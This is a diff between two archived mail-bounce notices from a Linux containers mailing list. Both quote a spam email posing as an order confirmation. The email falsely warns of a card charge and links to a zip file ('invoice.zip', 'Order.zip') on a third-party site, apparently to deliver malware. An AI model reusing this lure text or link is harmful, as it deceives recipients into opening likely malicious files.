@@ -1,7 +1,7 @@
-From: Mail Delivery System <Mailer-Daemon-xwy7W0e2/8gqetxTcFhQufd9D2ou9A/h@public.gmane.org>
-Subject: Mail delivery failed: returning message to sender
-Date: Thu, 23 Feb 2012 23:26:04 +0300
-Message-ID: <E1S0fEq-0005pt-7L@sl5.sahara.net.sa>
+From: MAILER-DAEMON-30WDsmTci5E9AqnQESScWDKzEDxYleXD@public.gmane.org
+Subject: failure notice
+Date: 24 Feb 2012 02:10:14 -0800
+Message-ID: <20120224101658.373D24BD@mail.linuxfoundation.org>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -18,33 +18,28 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This message was created automatically by mail delivery software.
+Hi. This is the qmail-send program at civic.chasehosting.com.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
 
-A message that you sent could not be delivered to one or more of its
-recipients. This is a permanent error. The following address(es) failed:
+<loughreecoop-CVfgzVlYcRg@public.gmane.org>:
+77.238.177.9 failed after I sent the message.
+Remote host said: 554 Message not allowed - [PH01] Email not accepted for policy reasons.  Please visit http://postmaster.yahoo.com/errors/postmaster-27.html [120]
 
-  pburke-E1w0E04eeGQ3lw97EnAbAg@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<pburke-E1w0E04eeGQ3lw97EnAbAg@public.gmane.org>:
-    host govgate1.tstechnology.net [137.191.227.11]:
-    550 5.7.1 <pburke-E1w0E04eeGQ3lw97EnAbAg@public.gmane.org>: Recipient address rejected:
-    Please see http://www.openspf.net/Why?s=mfrom;id=containers%40lists.linux-foundation.org;ip=212.76.85.39;r=relayg2.gov.tstechnology.net
+--- Below this line is a copy of the message.
 
------- This is a copy of the message, including all the headers. ------
-
-Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from 174-143-182-212.static.cloud-ips.com ([174.143.182.212]:56948 helo=blog.nomalistdesign.com)
-	by sl5.sahara.net.sa with esmtpa (Exim 4.69)
-	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1S0fEm-0005oy-Nq
-	for pburke-E1w0E04eeGQ3lw97EnAbAg@public.gmane.org; Thu, 23 Feb 2012 23:26:01 +0300
-Received: from [174.143.182.212] by blog.nomalistdesign.com id HBSj0agsmdBL with SMTP; Thu, 23 Feb 2012 20:25:53 +0000
-Date: Thu, 23 Feb 2012 20:25:53 +0000
-From: "billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.01.6) Business
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 28934 invoked by uid 108); 24 Feb 2012 02:10:11 -0800
+Received: from unknown (HELO blog.nomalistdesign.com) (contact-RPVU9oH5MV7zTZlNdBKIogC/G2K4zDHf@public.gmane.org@174.143.182.212)
+  by civic.chasehosting.com with ESMTPA; 24 Feb 2012 02:10:11 -0800
+Received: from [174.143.182.212] by blog.nomalistdesign.com id ka5fiu6DtMja with SMTP; Fri, 24 Feb 2012 10:10:10 +0000
+Date: Fri, 24 Feb 2012 10:10:10 +0000
+From: "Pay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v4.9.78.7) Educational
 X-Priority: 3 (Normal)
-Message-ID: <80625978.87060118174051-oYFICFIz4VW5PHSWFFpsopOMunqAqVKM@public.gmane.org>
-To: <pburke-E1w0E04eeGQ3lw97EnAbAg@public.gmane.org>
-Subject: Order.
+Message-ID: <338978815.36097766885251-oYFICFIz4VW5PHSWFFpsopOMunqAqVKM@public.gmane.org>
+To: <loughreecoop-CVfgzVlYcRg@public.gmane.org>
+Subject: Re: Order.
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
@@ -53,17 +48,17 @@ Content-Transfer-Encoding: 8bit
 
 
 
-Dear, Client
+Customer, 
 
-Thank you for the order,
+Thank you for the order, 
+id: 5551899868.
 
-This message is to inform you that your order has been received
-and is currently being processed.
+Your credit card will be charged for 1032 dollars.
 
-Your order reference is 468086.
+Information about the order and delivery located at:
 
-Your purchase and delivery information appears below located at:
-http://www.traspak.it/ie/invoice.zip
+http://www.traspak.it/ie/Order.zip?iduser=loughreecoop-CVfgzVlYcRg@public.gmane.org?0101078647
 
-==
-Best regards, Tel. / Fax.:  (637) 452 23 418.
+____________________________
+Best regards, ticket service.
+Tel. / Fax.:  (911) 999 51 403.              
